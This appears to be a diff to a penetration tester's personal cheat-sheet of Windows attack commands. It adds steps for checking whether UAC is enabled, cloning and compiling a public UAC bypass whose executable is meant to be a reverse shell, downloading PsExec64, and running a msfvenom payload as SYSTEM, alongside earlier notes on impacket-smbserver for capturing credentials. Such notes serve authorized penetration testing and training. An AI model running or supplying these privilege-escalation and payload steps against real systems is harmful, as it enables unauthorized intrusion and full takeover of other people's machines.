@@ -7,6 +7,8 @@
 # Sharing files (Exfil)
 https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
 
+
+
 - ---] impacket-smbserver (auth capture)
 
 # Configure SMB server
@@ -14,4 +16,24 @@ impacket-smbserver <sharename> <path to share>
 
 # Connect from Windows machine
 net view \\192.168.119.131
+
+
+
+- ---] Check UAC / BYPASS
+
+# Website reference
+https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
+
+# Check if UAC is enabled | Look for EnableLUA
+reg query HKLM\Software\microsoft\windows\currentversion\policies\system
+
+# clone the UAC bypass and compile with mwing // Don't forget to uncomment and change foobar.exe [grep it] // Executable should be another rev shell
+ git clone https://github.com/turbo/zero2hero
+ x86_64-w64-mingw32-gcc main.c -o bypass.exe
+
+# Now you can use psexec64 to elevate to system
+ wget https://github.com/davehardy20/sysinternals/raw/master/PsExec64.exe
+
+# Load your msfvenom payload with system level permissions 
+.\PsExec64.exe -i -accepteula -d -s C:\windows\temp\pwn.exe
 
